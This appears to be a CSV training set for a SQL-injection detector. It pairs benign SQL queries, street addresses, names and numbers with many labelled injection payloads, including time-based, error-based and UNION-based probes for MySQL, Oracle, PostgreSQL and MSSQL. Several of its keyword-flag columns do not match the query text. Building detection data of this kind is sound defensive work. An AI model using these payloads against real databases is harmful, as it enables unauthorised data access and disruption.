Query,SELECT,UNION,OR,AND,Label
"calle sol s/n,",0,0,0,0,0
SELECT * FROM movie,1,0,0,0,0
"1'  )   and 5556  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )  ",1,0,0,1,1
"  UPDATE bag SET pet =  'consonant', City =  'another' WHERE outer =  title",0,0,0,0,0
SELECT * FROM down WHERE Price NOT BETWEEN 10 AND 20,1,0,0,1,0
SELECT * FROM baseball ORDER BY giving DESC,1,0,1,0,0
"1%'  )   and 6537  =  dbms_pipe.receive_message  (  chr  (  76  )  ||chr  (  116  )  ||chr  (  117  )  ||chr  (  65  )  ,5  )   and   (  '%'  =  '",0,0,0,1,1
SELECT usually ( s )  FROM actual UNION ALL,1,1,0,0,0
" SELECT * FROM our ORDER BY knew, phrase",1,0,1,0,0
kale,0,0,0,0,0
milton,0,0,0,0,0
"1'   )    )    and row  (  6237,7469  )  >  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  6237  =  6237,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from   (  select 5192 union select 3785 union select 3931 union select 7158  )  a group by x  )   and    (    (   'adnz'  =  'adnz",1,1,1,1,1
"-4695'   )    )     )   union all select 5844,5844,5844,5844,5844,5844#",1,1,0,0,1
12413,0,0,0,0,0
9ot87ico,0,0,0,0,0
SELECT * FROM single WHERE been BETWEEN average09/01/1996movie AND work15/31/1996radio,1,0,1,1,0
"-4155'   )    )     )   union all select 1775,1775,1775,1775,1775,1775,1775--",1,1,0,0,1
"1%""   )    )   ",0,0,0,0,1
SELECT * FROM clothes WHERE Price NOT BETWEEN 10 AND 20,1,0,0,1,0
"1,  (  select 6825 from  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  6825  =  6825,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from information_schema.character_sets group by x  )  a  )  ",1,0,1,1,1
clav6ria,0,0,0,0,0
38847166m,0,0,0,0,0
sant andreu salou,0,0,0,1,0
"1%'   )    )     )   union all select null,null,null,null,null#",1,1,0,0,1
"1'   )    )    and 3707  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )   and    (    (   'tkcy' like 'tkcy",1,0,0,1,1
78248698f,0,0,0,0,0
SELECT of ( s ) FROM fact INNER JOIN,1,0,0,0,0
"1""  )   as zhlf where 4119  =  4119 or 5286  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )  --",1,0,1,0,1
"1%""  )   and 9660  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )  --",1,0,0,1,1
select case when 2948  =  7279 then 1 else null end--,1,0,0,0,1
SELECT TOP 3 * FROM between WHERE flame = 'what' SELECT * FROM newspaper,1,0,0,0,0
1'  )   where 3636  =  3636 or 4240  =    (  select 4240 from pg_sleep  (  5   )    )   --,1,0,1,0,1
"SELECT column1 , column2 , column3 , ... FROM table1 WHERE condition ; INSERT INTO Customers  ( CustomerName, City, Country )  ",1,0,0,0,0
SELECT * FROM angry WHERE foreign IN  ( SELECT smallest FROM separate ) ,1,0,1,0,0
"  SELECT * FROM potatoes WHERE loose IN  ( 'dull', 'sides', 'tea' )  ",1,0,0,0,0
SELECT * FROM wp_posts WHERE ID  =  347682 LIMIT 1,1,0,0,0,0
san miguel de abona,0,0,0,0,0
"-9954""   )    )    or 4144  =    (  select upper  (  xmltype  (  chr  (  60  )  ||chr  (  58  )  ||chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  4144  =  4144  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113  )  ||chr  (  62   )    )     )   from dual  )   and    (    (   ""bifi""  =  ""bifi",1,0,1,1,1
"1,  (  select 2*  (  if   (    (   select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  9693  =  9693,1   )    )     )  ,0x717a767a71,0x78   )    )   s  )  , 8446744073709551610, 8446744073709551610   )    )     )  ",1,0,0,0,1
"1"" and 2853  =  cast   (    (   chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113   )    )   ||  (  select   (  case when   (  2853  =  2853  )   then 1 else 0 end   )    )   ::text||  (  chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )    as numeric  )  ",1,0,0,1,1
"  SELECT examine,judge FROM position WHERE book = 'deep' UNION SELECT poetry, skin FROM school",1,1,0,0,0
1' where 2911  =  2911,0,0,0,0,1
wilson@autoconstruccion.fi,0,0,0,0,0
rocky,0,0,0,0,0
hao,0,0,0,0,0
SELECT * FROM rubber FETCH FIRST 50 PERCENT ROWS ONLY,1,0,0,0,0
"select count  (  *  )   from generate_series  (  1,5000000   )    )   ||'",1,0,0,0,1
"-8034""  )   where 1292  =  1292 union all select 1292,1292,1292,1292,1292#",1,1,0,0,1
1'  )   and sleep  (  5  )   and   (  'orxt'  =  'orxt,0,0,1,1,1
SELECT * FROM ordinary,1,0,1,0,0
1'   )    )    and 3754  =    (  select upper  (  xmltype  (  chr  (  60  )  ||chr  (  58  )  ||chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  3754  =  3754  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113  )  ||chr  (  62   )    )     )   from dual  )   and    (    (   'opyp'  =  'opyp,1,0,0,1,1
"c/ comedias, 109,",0,0,0,0,0
"-5819%""   )    )    or 4144  =    (  select upper  (  xmltype  (  chr  (  60  )  ||chr  (  58  )  ||chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  4144  =  4144  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113  )  ||chr  (  62   )    )     )   from dual  )   and    (    (   ""%""  =  """,1,0,1,1,1
81568460h,0,0,0,0,0
SELECT pen ( s )  FROM famous UNION ALL,1,1,0,0,0
-3634%'   )    )    or 2671  =  2434,0,0,1,0,1
surai,0,0,0,0,0
17536,0,0,0,0,0
"1""  )   as yecj where 1194  =  1194 and 8407  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )   --",1,0,0,1,1
"select count  (  *  )   from generate_series  (  1,5000000  )   and    (    (   ""%""  =  """,1,0,0,1,1
SELECT MIN ( hung )  AS shaking FROM breakfast,1,0,0,0,0
SELECT * FROM engineer FETCH FIRST 50 PERCENT ROWS ONLYSELECT TOP 3 * FROM goes,1,0,0,0,0
re9a3io,0,0,0,0,0
reiko,0,0,0,0,0
SELECT TOP 3 * FROM magic,1,0,0,0,0
"INSERT INTO voice ( whatever, combine, direct, this, select, mine )  VALUES  ( 'widely', 'storm'. child', 'football', 'sun', 'bent', 'scale' )  ",1,0,1,0,0
SELECT bigger ( s )  FROM rough SELECT reach ( s ) ,1,0,0,0,0
1%'   )    )    and 2006  =  2006,0,0,0,1,1
"c/ duran 52,",0,0,0,0,0
"1 and 2388  =  benchmark  (  5000000,md5  (  0x6d457153   )    )   #",0,0,0,1,1
SELECT * FROM more WHERE NOT height = 'bite'  AND NOT expression = 'aside',1,0,1,1,0
DELETE FROM slope,0,0,0,0,0
SELECT TOP 3 * FROM activity,1,0,0,0,0
"select * from generate_series  (  3551,3551,case when   (  3551  =  6451  )   then 1 else 0 end  )   limit 1--",1,0,0,0,1
"   SELECT Employees.herd, COUNT ( Orders.earlyID )  AS stoppedFROM    ( OrdersINNER JOIN symbol ON Orders.cornerID  =  Employees.spreadID ) ",1,0,1,0,0
WHERE EXISTS  ( SELECT ProductName FROM   Products WHERE SupplierId  =  Suppliers.supplierId AND Price < 20 ) ;,1,0,0,1,0
SELECT COUNT ( anyone ) FROM mistake,1,0,0,0,0
"1%'   )    )    and elt  (  1210  =  1210,sleep  (  5   )    )    and    (    (   '%'  =  '",0,0,0,1,1
"1 and row  (  6237,7469  )  >  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  6237  =  6237,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from   (  select 5192 union select 3785 union select 3931 union select 7158  )  a group by x  )  -- ofqd",1,1,1,1,1
"   SELECT COUNT ( try ) , statement FROM somewhere BY everybody",1,0,0,0,0
"INSERT INTO pole  ( earn, eat, corner )  VALUES  ( 'harder', 'sun', 'plus' )  ",0,0,1,0,0
"1'   )    )    and make_set  (  8403  =  8403,8899  )   and    (    (   'bmsa'  =  'bmsa",0,0,0,1,1
"1' or char  (  68  )  ||char  (  69  )  ||char  (  97  )  ||char  (  85  )    =  regexp_substring  (  repeat  (  right  (  char  (  5389  )  ,0  )  ,5000000000  )  ,null  )   and 'yaje'  =  'yaje",0,0,1,1,1
or 1 --',0,0,1,0,1
"1'   )    )    as kpdl where 4443  =  4443 union all select null,null,null,null,null,null--",1,1,0,0,1
"1""  )   rlike sleep  (  5  )  #",0,0,0,0,1
"1"" union all select null,null,null,null,null#",1,1,0,0,1
SELECT * FROM increase WHERE discovery LIKE '%make%',1,0,0,0,0
SELECT * FROM captured WHERE    NOT feathers = 'mountain',1,0,0,0,0
13082383y,0,0,0,0,0
1'  )   where 7903  =  7903,0,0,0,0,1
FROM  ( SELECT DISTINCT species FROM identity ) ,1,0,0,0,0
"-6381%"" or 8571  =  8571--",0,0,1,0,1
"don quijote 81,",0,0,0,0,0
"ignacio aldecoa, 30, 6h",0,0,0,0,0
SELECT kind FROM avoid UNION SELECT hurt FROM fastened ORDER BY fort,1,1,1,0,0
"ametlla de mar, l'",0,0,0,0,0
"1 and 6537  =  dbms_pipe.receive_message  (  chr  (  76  )  ||chr  (  116  )  ||chr  (  117  )  ||chr  (  65  )  ,5  )  # dbzk",0,0,0,1,1
"-5520""   )    )    as utqk where 7762  =  7762 or 5023  =  ctxsys.drithsx.sn  (  5023,  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  5023  =  5023  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )  --",1,0,1,0,1
"1%'  )   union all select null,null,null,null,null,null,null,null--",1,1,0,0,1
francisco jorquera s/n 1?d,0,0,1,0,0
SELECT * FROM porch WHERE Price NOT BETWEEN 10 AND 20,1,0,1,1,0
"  SELECT Orders.primitiverID, Employees.fair, Employees.brief FROM OrdersRIGHT JOIN Employees ON Orders.EmployeeID  =  Employees.identityID ORDER BY Orders.neighborhoodID",1,0,1,0,0
1'  )   union all select null--,1,1,0,0,1
SELECT nation FROM rising UNION ALL SELECT freedom FROM pool ORDER BY dirt,1,1,1,0,0
"  SELECT world AS hide, youth AS [flat]  FROM brave",1,0,1,0,0
"-3194""   )    )     )   or 4493  =  utl_inaddr.get_host_address  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  4493  =  4493  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )    and    (    (     (  ""erua""  =  ""erua",1,0,1,1,1
" end and    (    (   ""dmgj""  =  ""dmgj",0,0,0,1,1
-6586'   )    )    or 2021  =  2996,0,0,1,0,1
"1"" and 3707  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )   and ""hvwv""  =  ""hvwv",1,0,0,1,1
"1""  )   as hfgk where 1100  =  1100 or char  (  119  )  ||char  (  100  )  ||char  (  99  )  ||char  (  121  )    =  regexp_substring  (  repeat  (  right  (  char  (  1441  )  ,0  )  ,5000000000  )  ,null  )  --",0,0,1,0,1
SELECT AVG ( key )  FROM pair  SELECT SUM ( level ) ,1,0,0,0,0
"1   )    )    as fmpr where 3103  =  3103 and elt  (  9970  =  9297,9297  )  --",0,0,0,1,1
ajona valenzuela,0,0,0,0,0
"-6097%'   )    )    union all select 3990,3990,3990,3990,3990,3990--",1,1,0,0,1
" SELECT * FROM smell ORDER BY grow ASC, religious DESC",1,0,1,0,0
"  SELECT Orders.nearlyrID, Employees.suppose, Employees.balance FROM OrdersRIGHT JOIN Employees ON Orders.EmployeeID  =  Employees.provideID ORDER BY Orders.tapeID",1,0,1,0,0
"  (  select * from generate_series  (  3906,3906,case when   (  3906  =  3906  )   then 1 else 0 end  )   limit 1  )  ",1,0,0,0,1
75u1al3e,0,0,0,0,0
"1' where 6902  =  6902 and 6055  =  ctxsys.drithsx.sn  (  6055,  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  6055  =  6055  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )  --",1,0,0,1,1
8.59153E+15,0,0,0,0,0
volkmann_parfrey1@sigloventidos.be,0,0,0,0,0
"pobla tornesa, la",0,0,1,0,0
SELECT * FROM cowboy WHERE adjective BETWEEN 'nuts' AND 'sink',1,0,0,1,0
pool echenique,0,0,0,0,0
1'  )   where 5307  =  5307,0,0,0,0,1
"INSERT INTO base ( wind, view, eat, characteristic, fell, familiar )  VALUES  ( 'careful', 'struck'. sick', 'circus', 'star', 'amount', 'separate' )  ",0,0,0,0,0
3.82074E+15,0,0,0,0,0
-8071   )    )    or 9160  =  4253,0,0,1,0,1
7.67474E+13,0,0,0,0,0
 UPDATE pour SET busy = 'sent'WHERE drawn = 'important',0,0,1,0,0
"calle robert gerhard, s/n 6c",0,0,0,0,0
"  SELECT CustomerID AS ID, CustomerName AS Customer  FROM Customers;",1,0,0,0,0
1'||  (  select 'ocmk' from dual where 3961  =  3961 or 6793  =    (  select 6793 from pg_sleep  (  5   )    )     )  ||',1,0,1,0,1
SELECT * FROM wonderful WHERE warn = 'health' LIMIT 3,1,0,0,0,0
"1""  )   where 2278  =  2278",0,0,0,0,1
1490,0,0,0,0,0
hernani,0,0,0,0,0
"1""  )   where 7165  =  7165 or 8466  =  benchmark  (  5000000,md5  (  0x694a4745   )    )   --",0,0,1,0,1
"select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4 and    (    (     (  ""%""  =  """,1,0,0,1,1
35093869d,0,0,0,0,0
beninger,0,0,0,0,0
tinti@21horas.hr,0,0,1,0,0
3.12801E+15,0,0,0,0,0
SELECT * FROM mountain WHERE consist BETWEEN '1996-07-01' AND '1996-07-31',1,0,0,1,0
"1%""  )   or 5286  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )   and   (  ""%""  =  """,1,0,1,1,1
6.71861E+15,0,0,0,0,0
"-2207%'   )    )    union all select 3339,3339,3339,3339,3339,3339#",1,1,0,0,1
calabazas de fuentiduea,0,0,0,0,0
leshowit,0,0,0,0,0
 UPDATE replace SET smooth = 'instrument'WHERE rapidly = 'cream',0,0,0,0,0
SELECT * FROM born WHERE Price NOT BETWEEN 10 AND 20,1,0,1,1,0
24324,0,0,0,0,0
5a69io99t3,0,0,0,0,0
1'+  (  select byor where 4538  =  4538,1,0,1,0,1
-8878' in boolean mode  )   union all select 7785#,1,1,0,0,1
dennen_christlein@tantra-gay.sn,0,0,0,0,0
DELETE FROM cabin WHERE softly = 'compare',0,0,0,0,0
donaldo,0,0,0,0,0
fonterosa vjar,0,0,0,0,0
"-5524  )   as eoyk where 6928  =  6928 union all select 6928,6928,6928,6928,6928,6928,6928,6928,6928--",1,1,0,0,1
valdivieso,0,0,0,0,0
3.22773E+15,0,0,0,0,0
"1,  (  select 9100  =    (  'qqpjq'||  (  select case 9100 when 9100 then 1 else 0 end from rdb$database  )  ||'qzvzq'   )    )   ",1,0,0,0,1
mortensen@look2fly.nr,0,0,1,0,0
"   SELECT wave, reason+ ', ' + produce+ ' ' + class+ ', ' + or AS behavior  FROM dawn",1,0,1,0,0
1'||  (  select 'ldad' where 6146  =  6146 rlike   (  select   (  case when   (  7689  =  7689  )   then 1 else 0x28 end   )    )     )  ||',1,0,0,0,1
SELECT AVG ( tree ) FROM nervous SELECT SUM ( happy ) ,1,0,0,0,0
"1%"" or 2633  =  dbms_pipe.receive_message  (  chr  (  112  )  ||chr  (  65  )  ||chr  (  65  )  ||chr  (  103  )  ,5  )   and ""%""  =  """,0,0,1,1,1
select   (  case when   (  7852  =  7476  )   then 7852 else 7852*  (  select 7852 from mysql.db  )   end  )  #,1,0,0,0,1
"  SELECT water AS dug, composition AS [situation]  FROM nodded",1,0,0,0,0
waitfor delay '0:0:5'--,0,0,1,0,1
SELECT TOP 3 * FROM kept SELECT * FROM stove 3SELECT * FROM blood,1,0,0,0,0
"1""   )    )     )    (  select   (  case when   (  5451  =  5451  )   then regexp_substring  (  repeat  (  right  (  char  (  5451  )  ,0  )  ,500000000  )  ,null  )   else char  (  108  )  ||char  (  76  )  ||char  (  112  )  ||char  (  116  )   end  )   from information_schema.system_users  )   and    (    (     (  ""znzb"" like ""znzb",1,0,1,1,1
SELECT why ( s )  FROM just FULL OUTER JOIN,1,0,0,0,0
1 where 8393  =  8393,0,0,0,0,1
1'  )   as oknw where 8777  =  8777,0,0,0,0,1
1%' or   (  select * from   (  select  (  sleep  (  5   )    )     )  ydpu  )   and '%'  =  ',1,0,1,1,1
cos6rio,0,0,0,0,0
"1""   )    )    or updatexml  (  1808,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  1808  =  1808,1   )    )     )  ,0x717a767a71  )  ,8666  )   and    (    (   ""ghdr"" like ""ghdr",1,0,1,1,1
SELECT AVG ( twice ) FROM fair,1,0,0,0,0
"1"" where 4066  =  4066 and updatexml  (  3393,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  3393  =  3393,1   )    )     )  ,0x717a767a71  )  ,1161  )  --",1,0,0,1,1
SELECT material ( s )  FROM port SELECT automobile FROM almost,1,0,1,0,0
"  SELECT vapor AS flew, dog AS [cent]  FROM her",1,0,1,0,0
SELECT * FROM one FETCH FIRST 3 ROWS ONLY,1,0,0,0,0
"1,  (  select   (  case when   (  3717  =  3717  )   then 1 else 3717*  (  select 3717 from master..sysdatabases  )   end   )    )   ",1,0,0,0,1
1' or sleep  (  5  ) ,0,0,1,0,1
"1'  )   and 5556  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )   and   (  'hfxu' like 'hfxu",1,0,0,1,1
tomi,0,0,0,0,0
gatada,0,0,0,0,0
"plza. leire, 1, 6?a",0,0,0,0,0
"callejon sur, 93 13-c",0,0,0,0,0
SELECT AVG ( unhappy ) FROM require SELECT SUM ( trip ) ,1,0,0,0,0
1'   )    )     )   and 7756  =  dbms_utility.sqlid_to_sqlhash   (    (   chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  7756  =  7756  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )   and    (    (     (  'ugoz'  =  'ugoz,1,0,0,1,1
"select dbms_pipe.receive_message  (  chr  (  66  )  ||chr  (  67  )  ||chr  (  79  )  ||chr  (  101  )  ,5  )   from dual and   (  'qomf' like 'qomf",1,0,0,1,1
chapurrar,0,0,0,0,0
""" """,0,0,0,0,1
"-8106%""  )   union all select 2051,2051,2051,2051,2051,2051#",1,1,0,0,1
8182,0,0,0,0,0
"1' and   (  select 9067 from  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  9067  =  9067,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from information_schema.character_sets group by x  )  a  )   and 'lywy' like 'lywy",1,0,1,1,1
"1 union all select 1,2,3,4,5,6,name from sysobjects where xtype   =   'u' --",1,1,0,0,1
noami,0,0,0,0,0
SELECT MIN ( using )  AS rays FROM later,1,0,0,0,0
SELECT MIN ( surprise )  AS support FROM work,1,0,1,0,0
1064,0,0,0,0,0
"1'   )    )    and updatexml  (  3393,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  3393  =  3393,1   )    )     )  ,0x717a767a71  )  ,1161  )   and    (    (   'ayqn' like 'ayqn",1,0,0,1,1
SELECT ocean FROM ran,1,0,0,0,0
SELECT * FROM metal WHERE trouble BETWEEN 'constantly' AND 'alike',1,0,0,1,0
"  SELECT * FROM black WHERE paint NOT IN  ( 'visitor', 'swim', 'raise' )  ",1,0,1,0,0
"1%'   )    )     )    (  select   (  case when   (  5451  =  5451  )   then regexp_substring  (  repeat  (  right  (  char  (  5451  )  ,0  )  ,500000000  )  ,null  )   else char  (  108  )  ||char  (  76  )  ||char  (  112  )  ||char  (  116  )   end  )   from information_schema.system_users  )   and    (    (     (  '%'  =  '",1,0,1,1,1
SELECT * FROM globe WHERE hide NOT BETWEEN 'appearance' AND 'common',1,0,0,1,0
SELECT TOP 3 * FROM least WHERE cook = 'wolf',1,0,0,0,0
1'   )    )    rlike   (  select * from   (  select  (  sleep  (  5   )    )     )  sgvo  )   and    (    (   'pemj'  =  'pemj,1,0,0,1,1
SELECT AVG ( told )  FROM welcome  SELECT SUM ( yesterday ) ,1,0,0,0,0
SELECT AVG ( pan ) FROM conversation SELECT SUM ( notice ) ,1,0,0,0,0
SELECT TOP 50 PERCENT * FROM same SELECT * FROM love FETCH FIRST 50 PERCENT ROWS ONLYSELECT TOP 3 * FROM wood,1,0,0,0,0
6.1643E+15,0,0,0,0,0
"-7139""  )   where 2723  =  2723 or 3900  =  5082--",0,0,1,0,1
"1 and   (  select 9067 from  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  9067  =  9067,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from information_schema.character_sets group by x  )  a  )  # myqr",1,0,1,1,1
1   )    )    as qgma where 7675  =  7675 rlike   (  select * from   (  select  (  sleep  (  5   )    )     )  vwyq  )  #,1,0,0,0,1
select   (  case when   (  7169  =  7785  )   then 1 else 7169*  (  select 7169 from master..sysdatabases  )   end  )  --,1,0,0,0,1
FROM  ( SELECT DISTINCT butter FROM class ) ,1,0,0,0,0
1'   )    )     )   and 2006  =  2006,0,0,0,1,1
fuente de piedra,0,0,0,0,0
SELECT bat ( s )  FROM sort UNION,1,1,1,0,0
" SELECT * FROM directly ORDER BY river ASC, return DESC",1,0,1,0,0
SELECT COUNT ( just )  FROM shoe,1,0,0,0,0
1 where 2956  =  2956,0,0,0,0,1
"  UPDATE give SET alive =  'post', City =  'hunt' WHERE became =  lose",0,0,0,0,0
SELECT * FROM speed WHERE NOT wagon = 'throw'  AND NOT distance = 'depth',1,0,0,1,0
" SELECT * FROM correct ORDER BY clothing, leader",1,0,1,0,0
SELECT * FROM should WHERE spell BETWEEN '1996-07-01' AND '1996-07-31',1,0,0,1,0
1'  )   rlike sleep  (  5  )   and   (  'tslp'  =  'tslp,0,0,0,1,1
SELECT here FROM length,1,0,0,0,0
alexiana,0,0,0,0,0
SELECT lost ( s )  FROM structure FULL OUTER JOIN,1,0,0,0,0
poblacin de arroyo,0,0,0,0,0
" SELECT FIELD ( 5, 0, 1, 2, 3, 4, 5 ) ;",1,0,0,0,0
"1%'   )    )    or 9643  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )   and    (    (   '%'  =  '",1,0,1,1,1
"praza san antonio da florida, 27,",0,0,1,0,0
SELECT TOP 3 * FROM moon,1,0,0,0,0
SELECT * FROM plane,1,0,0,0,0
"1   )    )    and 2716  =    (  select count  (  *  )   from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7  )  --",1,0,0,1,1
"   SELECT COUNT ( heard ) , floating FROM harder BY difficult",1,0,0,0,0
SELECT * FROM condition WHERE basis BETWEEN '1996-07-01' AND '1996-07-31',1,0,0,1,0
1'+  (  select 'jkgf' where 7487  =  7487,1,0,0,0,1
"c/ montealegre s/n, 9-b",0,0,0,0,0
1 or sleep  (  5  ) ,0,0,1,0,1
SELECT * FROM visit FETCH FIRST 3 ROWS ONLY,1,0,0,0,0
"   SELECT broad, blank+ ', ' + alike+ ' ' + managed+ ', ' + smallest AS dangerous  FROM meet",1,0,0,0,0
1' or 6793  =    (  select 6793 from pg_sleep  (  5   )    ) ,1,0,1,0,1
" select * from users where id  =  1 or "".%"" or 1  =  1 -- 1",1,0,1,0,1
gelis,0,0,0,0,0
ren,0,0,0,0,0
1'||  (  select 'ilkr' from dual where 9296  =  9296,1,0,0,0,1
"1 where 9279  =  9279 or 7427  =  dbms_pipe.receive_message  (  chr  (  116  )  ||chr  (  87  )  ||chr  (  90  )  ||chr  (  109  )  ,5  )  --",0,0,1,0,1
1'+  (  select 'ggkm' where 3394  =  3394,1,0,0,0,1
 select * from information_schema.tables--,1,0,1,0,1
SELECT * FROM man WHERE prove IN  ( SELECT are FROM way ) ,1,0,0,0,0
SELECT WEEK ( CURDATE (   )  )  ;,1,0,0,0,0
"1""  )   or updatexml  (  1808,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  1808  =  1808,1   )    )     )  ,0x717a767a71  )  ,8666  )   and   (  ""wvkp"" like ""wvkp",1,0,1,1,1
waitfor delay '0:0:5'-- thuo,0,0,1,0,1
"  SELECT * FROM all WHERE better NOT IN  ( 'general', 'square', 'fox' )  ",1,0,0,0,0
"  SELECT DATE_FORMAT ( BirthDate, ""%W %M %e %Y"" )  FROM Employees;",1,0,1,0,0
"1%""   )    )    and 5556  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )   and    (    (   ""%""  =  """,1,0,0,1,1
"1,  (  select   (  case when   (  1255  =  8025  )   then 1 else 1255*  (  select 1255 from mysql.db  )   end   )    )   ",1,0,0,0,1
"1'   )    )    as ylyq where 2953  =  2953 and 2716  =    (  select count  (  *  )   from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7  )  --",1,0,0,1,1
"1""  )   as ktnq where 9005  =  9005",0,0,0,0,1
SELECT * FROM atom 3 SELECT * FROM immediately,1,0,0,0,0
SELECT * FROM  ( SELECT left FROM quarter ) ,1,0,0,0,0
SELECT * FROM prove ORDER BY noun,1,0,1,0,0
adrie,0,0,0,0,0
"SELECT NULLIF ( 25, ""Hello"" ) ;",1,0,0,0,0
bijman3,0,0,0,0,0
SELECT * FROM sea WHERE being = 'sugar' FETCH FIRST 3 ROWS ONLY,1,0,0,0,0
SELECT * FROM finish 3 SELECT * FROM pale,1,0,0,0,0
"1 and   (  select 2*  (  if   (    (   select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  3484  =  3484,1   )    )     )  ,0x717a767a71,0x78   )    )   s  )  , 8446744073709551610, 8446744073709551610   )    )     )  -- tzry",1,0,0,1,1
"1%' and extractvalue  (  7982,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  7982  =  7982,1   )    )     )  ,0x717a767a71   )    )    and '%'  =  '",1,0,0,1,1
SELECT next ( s )  FROM post UNION,1,1,0,0,0
1'+  (  select echl where 6593  =  6593 rlike   (  select * from   (  select  (  sleep  (  5   )    )     )  vwyq  )  #,1,0,0,0,1
